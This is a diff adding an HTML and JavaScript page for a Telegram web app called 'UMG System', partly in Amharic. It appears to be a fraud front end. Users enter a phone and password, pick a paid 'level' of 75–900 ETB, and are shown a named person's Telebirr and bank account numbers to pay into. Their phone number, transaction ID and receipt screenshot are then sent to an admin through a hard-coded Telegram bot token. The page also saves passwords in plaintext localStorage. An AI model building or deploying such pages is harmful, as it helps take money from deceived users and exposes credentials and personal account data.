@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="am">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UMG System</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #000000; color: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        
+        .app-container { width: 100%; max-width: 414px; background-color: #1a1a1a; min-height: 100vh; position: relative; box-shadow: 0 0 20px rgba(0, 0, 0, 0.8); }
+
+        .login-header {
+            background: linear-gradient(180deg, #1e3c72 0%, #2a5298 100%);
+            height: 220px;
+            border-bottom-left-radius: 50% 20px;
+            border-bottom-right-radius: 50% 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .logo-circle {
+            width: 70px; height: 70px;
+            border: 2px solid rgba(255,255,255,0.6);
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 30px; color: #2196f3; margin-bottom: 10px;
+        }
+        .brand-title { font-size: 20px; font-weight: bold; letter-spacing: 1px; color: #fff; }
+
+        .login-body { padding: 30px 20px; }
+        .input-group {
+            background: #ffffff; border-radius: 8px;
+            display: flex; align-items: center; padding: 12px 15px; margin-bottom: 15px;
+        }
+        .input-group span { color: #333; font-weight: bold; margin-right: 10px; border-right: 1px solid #ccc; padding-right: 10px; }
+        .input-group input { border: none; outline: none; width: 100%; font-size: 15px; color: #000; background: transparent; }
+        .remember-me { display: flex; align-items: center; gap: 8px; font-size: 13px; color: #aaa; margin-bottom: 25px; cursor: pointer; }
+        .remember-me input { accent-color: #2196f3; width: 16px; height: 16px; }
+
+        .btn-login {
+            width: 100%; padding: 14px; background: #2196f3; color: white;
+            border: none; border-radius: 25px; font-size: 16px; font-weight: bold; cursor: pointer;
+        }
+
+        .modal-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.85); display: flex; justify-content: center; align-items: center; z-index: 1000;
+        }
+
+        .modal-box-tip {
+            background: #ffffff; color: #333; width: 85%; max-width: 330px;
+            border-radius: 12px; padding: 20px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            position: relative;
+        }
+        .modal-tip-title { font-size: 16px; font-weight: bold; margin-bottom: 15px; color: #333; }
+        .modal-tip-body { font-size: 14px; color: #555; margin-bottom: 20px; }
+        .modal-tip-buttons { display: flex; border-top: 1px solid #eee; margin-top: 15px; padding-top: 12px; gap: 10px; }
+        .btn-tip { flex: 1; border: none; background: transparent; font-size: 15px; font-weight: bold; cursor: pointer; padding: 5px; border-radius: 5px; }
+        .btn-tip-cancel { color: #666; background: #f0f0f0; }
+        .btn-tip-confirm { color: #fff; background: #2196f3; }
+
+        .modal-box-dark { background: #2a2a2a; width: 85%; max-width: 320px; border-radius: 12px; padding: 20px; text-align: center; position: relative; }
+        .option-btn {
+            width: 100%; padding: 12px; background: #383838; color: #fff;
+            border: 1px solid #444; border-radius: 8px; margin-bottom: 10px; font-size: 15px; cursor: pointer; font-weight: bold;
+        }
+
+        .pay-option {
+            background: #f5f5f5; color: #000; padding: 12px; border-radius: 8px;
+            margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; font-weight: 500;
+        }
+        .input-field { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ccc; border-radius: 5px; font-size: 14px; }
+        .file-label { display: block; text-align: left; font-size: 12px; color: #666; margin-top: 6px; }
+
+        .btn-action { padding: 10px 20px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
+        .btn-cancel-act { background: #666; color: #fff; }
+        .btn-confirm-act { background: #e53935; color: #fff; }
+
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+
+<div class="app-container">
+
+    <!-- STEP 1: LOGIN -->
+    <div id="screen-login">
+        <div class="login-header">
+            <div class="logo-circle"><i class="fa-solid fa-globe"></i></div>
+            <div class="brand-title">UMG</div>
+        </div>
+        <div class="login-body">
+            <div class="input-group">
+                <span>+251</span>
+                <input type="tel" id="phone" placeholder="9********">
+            </div>
+            <div class="input-group">
+                <i class="fa-solid fa-lock" style="color: #fbc02d; margin-right: 10px;"></i>
+                <input type="password" id="password" placeholder="••••••">
+                <i class="fa-solid fa-eye" id="togglePassword" style="color: #666; cursor: pointer;"></i>
+            </div>
+            <label class="remember-me">
+                <input type="checkbox" id="rememberMe"> Remember Username/Password
+            </label>
+            <button class="btn-login" onclick="handleLoginClick()">Login Now</button>
+        </div>
+    </div>
+
+    <!-- STEP 2: LEVEL SELECTION -->
+    <div id="modal-levels" class="modal-overlay hidden">
+        <div class="modal-box-dark">
+            <div style="font-size: 16px; color: #ddd; margin-bottom: 15px; font-weight: bold; margin-top: 10px;">ከዚህ በፊት የትኛው ውስጥ ነበሩ! እባክዎ በትክክል ይምረጡ</div>
+            <button class="option-btn" onclick="selectLevel('U1', 75)">U1</button>
+            <button class="option-btn" onclick="selectLevel('U2', 150)">U2</button>
+            <button class="option-btn" onclick="selectLevel('U3', 300)">U3</button>
+            <button class="option-btn" onclick="selectLevel('U4', 500)">U4</button>
+            <button class="option-btn" onclick="selectLevel('U5', 900)">U5</button>
+        </div>
+    </div>
+
+    <!-- STEP 3: REAL-NAME VERIFICATION MODAL -->
+    <div id="modal-verification-tip" class="modal-overlay hidden">
+        <div class="modal-box-tip">
+            <div class="modal-tip-title" style="margin-top: 10px;">Tip</div>
+            <div class="modal-tip-body">Please complete real-name verification</div>
+            <div class="modal-tip-buttons">
+                <button class="btn-tip btn-tip-cancel" onclick="showScreen('screen-login')">Cancel</button>
+                <button class="btn-tip btn-tip-confirm" onclick="proceedToPaymentSelect()">Confirm</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- STEP 4: PAYMENT METHOD SELECTION -->
+    <div id="modal-payment-select" class="modal-overlay hidden">
+        <div class="modal-box-tip" style="max-width: 340px;">
+            <div class="modal-tip-title" style="margin-top: 10px;">Select Payment Method</div>
+            <div class="pay-option" onclick="openPaymentForm('Telebirr', '0939824361', 'Hiwot')">
+                <span>Telebirr Account</span> <i class="fa-solid fa-chevron-right"></i>
+            </div>
+            <div class="pay-option" onclick="openPaymentForm('CBE', '1000139470277', 'Ms Hiwot Eshetu')">
+                <span>CBE Account (ንግድ ባንክ)</span> <i class="fa-solid fa-chevron-right"></i>
+            </div>
+            <button class="btn-action btn-cancel-act" style="width: 100%; margin-top: 5px;" onclick="document.getElementById('modal-payment-select').classList.add('hidden'); document.getElementById('modal-verification-tip').classList.remove('hidden');">Back</button>
+        </div>
+    </div>
+
+    <!-- STEP 5: TRANSACTION INPUT (12 DIGITS ONLY) -->
+    <div id="modal-payment-form" class="modal-overlay hidden">
+        <div class="modal-box-tip" style="max-width: 340px;">
+            <div class="modal-tip-title" id="payment-provider-title" style="margin-top: 10px;">Payment Details</div>
+            
+            <div style="font-size: 13px; color: #444; margin-bottom: 12px; text-align: left; background: #f8f9fa; padding: 10px; border-radius: 6px;">
+                <p>Amount: <b id="pay-amount-text" style="color:#d32f2f;">0 ETB</b></p>
+                <p>Account Name: <b id="pay-account-name" style="color:#2e7d32;">---</b></p>
+                <p>Account No: <b id="pay-account-number" style="color:#1976d2;">---</b></p>
+            </div>
+
+<input type="tel" id="transaction-id" class="input-field" placeholder="የክፍያ ቁጥር (Tx ID) ያስገቡ" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+
+            
+            <label class="file-label">Upload Receipt Screenshot:</label>
+            <input type="file" id="screenshot-file" class="input-field" accept="image/*" style="padding: 6px;">
+
+            <div style="display: flex; gap: 10px; margin-top: 12px;">
+                <button class="btn-action btn-cancel-act" style="flex:1;" onclick="document.getElementById('modal-payment-form').classList.add('hidden'); document.getElementById('modal-payment-select').classList.remove('hidden');">Back</button>
+                <button class="btn-action btn-confirm-act" style="flex:1; background:#2196f3;" onclick="submitToAdmin()">Submit</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- STEP 6: VERIFICATION PENDING SCREEN -->
+    <div id="modal-pending" class="modal-overlay hidden">
+        <div class="modal-box-tip">
+            <i class="fa-solid fa-clock-rotate-left" style="font-size: 40px; color: #f57c00; margin-bottom: 10px;"></i>
+            <div class="modal-tip-title">Verification Pending</div>
+            <p style="font-size: 13px; color: #666; margin-bottom: 15px;">
+                መረጃው ወደ UMG-Luna ተልኳል። UMG-Luna እስኪቀበልዎ ድረስ በትግስት ይጠብቁ <b>Pending</b> ላይ ይቆያል።
+            </p>
+            <button class="btn-action btn-confirm-act" style="width:100%; background: #2196f3;" onclick="checkApprovalStatus()">Check Approval Status</button>
+        </div>
+    </div>
+
+</div>
+
+<script>
+    const BOT_TOKEN = "8700938687:AAG4XSwCG39yN0oXZfKA5PlvHOKwiEgo4SI";
+    const ADMIN_CHAT_ID = "6660328033";
+
+    const tg = window.Telegram?.WebApp;
+    if(tg) tg.expand();
+
+    const phoneInput = document.getElementById('phone');
+    const passwordInput = document.getElementById('password');
+    const rememberMeCheckbox = document.getElementById('rememberMe');
+    const togglePasswordBtn = document.getElementById('togglePassword');
+
+    let selectedLevel = null;
+    let selectedAmount = 0;
+    let selectedMethod = '';
+
+    window.onload = function() {
+        const savedPhone = localStorage.getItem('umg_phone');
+        const savedPassword = localStorage.getItem('umg_password');
+        const rememberState = localStorage.getItem('umg_remember');
+
+        if (rememberState === 'true' && savedPhone && savedPassword) {
+            phoneInput.value = savedPhone;
+            passwordInput.value = savedPassword;
+            rememberMeCheckbox.checked = true;
+        }
+
+        // መተግበሪያው ሲከፈት ሁልጊዜ መጀመሪያ የሚጀምረው ከ Login Screen ነው (auto-redirect ወደ dashboard/pending አይደረግም)
+        showScreen('screen-login');
+    };
+
+    togglePasswordBtn.addEventListener('click', () => {
+        const isPassword = passwordInput.getAttribute('type') === 'password';
+        passwordInput.setAttribute('type', isPassword ? 'text' : 'password');
+        togglePasswordBtn.classList.toggle('fa-eye');
+        togglePasswordBtn.classList.toggle('fa-eye-slash');
+    });
+
+    // ሎጊን ሲደረግ የሚከናወን
+    function handleLoginClick() {
+        const phone = phoneInput.value.trim();
+        const password = passwordInput.value.trim();
+
+        if (!phone || !password) {
+            alert('እባክዎን ስልክ ቁጥር እና የይለፍ ቃል ያስገቡ!');
+            return;
+        }
+
+        // Telegram ID Lock Check
+        const telegramUser = tg?.initDataUnsafe?.user;
+        const currentTgId = telegramUser ? telegramUser.id : null;
+        const savedTgId = localStorage.getItem('umg_telegram_id');
+
+        if (savedTgId && currentTgId && savedTgId !== String(currentTgId)) {
+            alert("ይህ አካውንት ከተለየ Telegram Account ጋር የተያያዘ ነው! በሌላ Telegram መግባት አይችሉም።");
+            return;
+        }
+
+        if (currentTgId && !savedTgId) {
+            localStorage.setItem('umg_telegram_id', currentTgId);
+        }
+
+        // Remember Me Handler
+        if (rememberMeCheckbox.checked) {
+            localStorage.setItem('umg_phone', phone);
+            localStorage.setItem('umg_password', password);
+            localStorage.setItem('umg_remember', 'true');
+        } else {
+            localStorage.removeItem('umg_phone');
+            localStorage.removeItem('umg_password');
+            localStorage.setItem('umg_remember', 'false');
+        }
+
+        // የተጠቃሚውን ስቴት እንፈትሻለን
+        const userStatus = localStorage.getItem('umg_user_status');
+
+        if (userStatus === 'approved') {
+            // አድሚኑ አጸድቆታል -> ወደ dashboard.html ይሄዳል
+            window.location.href = 'dashboard.html';
+        } else if (userStatus === 'pending') {
+            // አድሚኑ ገና አላጸደቀውም -> እዛው ፔንዲንግ ገጽ ላይ ይቆያል
+            showScreen('modal-pending');
+        } else {
+            // የመጀመሪያ ጊዜ ግባቱ ነው -> Level እንዲመርጥ ይደረጋል
+            showScreen('modal-levels');
+        }
+    }
+
+    function selectLevel(level, amount) {
+        selectedLevel = level;
+        selectedAmount = amount;
+
+        localStorage.setItem('umg_selected_level', level);
+        localStorage.setItem('umg_selected_amount', amount);
+
+        hideAllModals();
+        document.getElementById('modal-verification-tip').classList.remove('hidden');
+    }
+
+    function proceedToPaymentSelect() {
+        hideAllModals();
+        document.getElementById('modal-payment-select').classList.remove('hidden');
+    }
+
+    function openPaymentForm(method, accNumber, accName) {
+        selectedMethod = method;
+        document.getElementById('payment-provider-title').innerText = method + " Payment";
+        document.getElementById('pay-amount-text').innerText = selectedAmount + " ETB (" + selectedLevel + ")";
+        document.getElementById('pay-account-name').innerText = accName;
+        document.getElementById('pay-account-number').innerText = accNumber;
+        
+        hideAllModals();
+        document.getElementById('modal-payment-form').classList.remove('hidden');
+    }
+
+    async function submitToAdmin() {
+        const txId = document.getElementById('transaction-id').value.trim();
+        const fileInput = document.getElementById('screenshot-file');
+
+                if (!txId) {
+            alert("እባክዎን Transaction ID ያስገቡ!");
+            return;
+        }
+
+        const numbersOnlyRegex = /^\d+$/;
+        if (!numbersOnlyRegex.test(txId)) {
+            alert("እባክዎን ቁጥር ብቻ ያስገቡ!");
+            return;
+        }
+
+        if (fileInput.files.length === 0) {
+            alert("እባክዎን የደረሰኝ ስክሪንሾት ያያይዙ!");
+            return;
+        }
+
+        const phone = phoneInput.value.trim();
+        const screenshotFile = fileInput.files[0];
+
+        const caption = `<b>🚨 አዲስ የክፍያ ጥያቄ!</b>\n\n` +
+                        `<b>📱 Phone:</b> ${phone}\n` +
+                        `<b>🎯 Level:</b> ${selectedLevel}\n` +
+                        `<b>💰 Amount:</b> ${selectedAmount} ETB\n` +
+                        `<b>🏦 Method:</b> ${selectedMethod}\n` +
+                        `<b>🧾 Tx ID:</b> <code>${txId}</code>`;
+
+        try {
+            const formData = new FormData();
+            formData.append('chat_id', ADMIN_CHAT_ID);
+            formData.append('photo', screenshotFile);
+            formData.append('caption', caption);
+            formData.append('parse_mode', 'HTML');
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+
+            // መረጃው ሲላክ ስቴቱን ወደ pending እንለውጠዋለን
+            localStorage.setItem('umg_user_status', 'pending');
+            hideAllModals();
+            document.getElementById('modal-pending').classList.remove('hidden');
+        } catch (err) {
+            console.error(err);
+            alert("መረጃውን መላክ አልተቻለም። እባክዎ ድጋሚ ይሞክሩ።");
+        }
+    }
+
+    function checkApprovalStatus() {
+        const currentStatus = localStorage.getItem('umg_user_status');
+        if (currentStatus === 'approved') {
+            window.location.href = 'dashboard.html';
+        } else {
+            alert("አካውንትዎ ገና በPending ላይ ነው። አድሚኑ ሲያጸድቀው ወደ dashboard.html ይገባሉ።");
+        }
+    }
+
+    function hideAllModals() {
+        document.getElementById('screen-login').classList.add('hidden');
+        const ids = ['modal-levels', 'modal-verification-tip', 'modal-payment-select', 'modal-payment-form', 'modal-pending'];
+        ids.forEach(id => {
+            const el = document.getElementById(id);
+            if(el) el.classList.add('hidden');
+        });
+    }
+
+    function showScreen(screenId) {
+        hideAllModals();
+        if (screenId === 'screen-login') {
+            document.getElementById('screen-login').classList.remove('hidden');
+        } else {
+            document.getElementById(screenId).classList.remove('hidden');
+        }
+    }
+</script>
+
+</body>
+</html>
